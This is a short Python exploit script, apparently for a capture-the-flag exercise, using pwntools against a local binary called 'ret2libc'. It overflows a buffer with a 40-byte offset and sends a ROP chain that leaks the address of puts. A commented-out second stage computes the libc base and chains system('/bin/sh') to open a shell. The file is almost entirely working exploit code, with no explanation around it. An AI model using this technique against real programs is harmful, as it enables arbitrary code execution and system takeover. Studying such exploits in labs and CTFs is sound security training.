#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'

elf = ELF('ret2libc')
p = elf.process()

rop = ROP(elf)
rop.call("puts", [elf.got['puts']])
rop.call("main")
offset = 40

payload = [
    b"A"*offset,
    rop.chain()
]

print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

payload = b"".join(payload)
p.sendline(payload)
log.info("envoie du payload")

puts = u64(p.recvline().rstrip()[2:].ljust(8, b'\x00'))
log.info(f"puts : {hex(puts)}")

# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
# print(p.recvline())
#
# libc = ELF('./libc-2.27.so')
# libc.address = puts - libc.symbols["puts"]
# log.info(f"libc base {hex(libc.address)}")
#
# rop = ROP(libc)
# # rop.call("puts", [next(libc.search(b"/bin/sh\x00"))])
# rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
# rop.call("exit")
#
# payload = [
#     b"A"*offset,
#     rop.chain()
# ]
#
# payload = b"".join(payload)
# p.sendline(payload)
#
# p.interactive()
